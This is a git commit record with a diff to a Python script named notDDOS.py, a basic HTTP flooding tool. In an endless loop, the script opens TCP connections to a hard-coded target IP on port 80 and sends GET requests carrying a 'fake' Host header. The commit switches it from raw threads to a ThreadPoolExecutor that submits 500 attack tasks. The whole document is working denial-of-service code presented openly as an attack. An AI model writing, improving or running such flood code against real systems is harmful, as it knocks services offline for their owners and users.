ed8aedbf2424d20c64ebe38c7ca7f954c99bca86
nicoleman0 <nicholashadleycoleman@gmail.com>
2025-03-13 00:36:11 -0400

    Refactor attack function to use ThreadPoolExecutor for improved concurrency

--- notDDOS.py
+++ notDDOS.py
@@ -1,7 +1,8 @@
 import socket
 import threading
+from concurrent.futures import ThreadPoolExecutor
 
-target = "192.168.1.1" # 
+target = "192.168.1.1" # target IP address
 fake_ip = "182.21.20.32"
 port = 80
 
@@ -9,10 +10,10 @@ def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port)) # connect to the target
-        s.sendto (f"GET /{target} HTTP/1.1\r\n".encode('ascii'), (target, port)) # send a request to the target
-        s.sendto (f"Host: {fake_ip}\r\n\r\n".encode('ascii'), (target, port)) # send a fake ip address
+        s.send(f"GET /{target} HTTP/1.1\r\n".encode('ascii')) # send a request to the target
+        s.send(f"Host: {fake_ip}\r\n\r\n".encode('ascii')) # send a fake ip address
         s.close()
-        
-for i in range(500):
-    thread = threading.Thread(target=attack, args=(target, fake_ip, port))
-    thread.start()
+
+with ThreadPoolExecutor(max_workers=50) as executor:
+    for i in range(500):
+        executor.submit(attack)
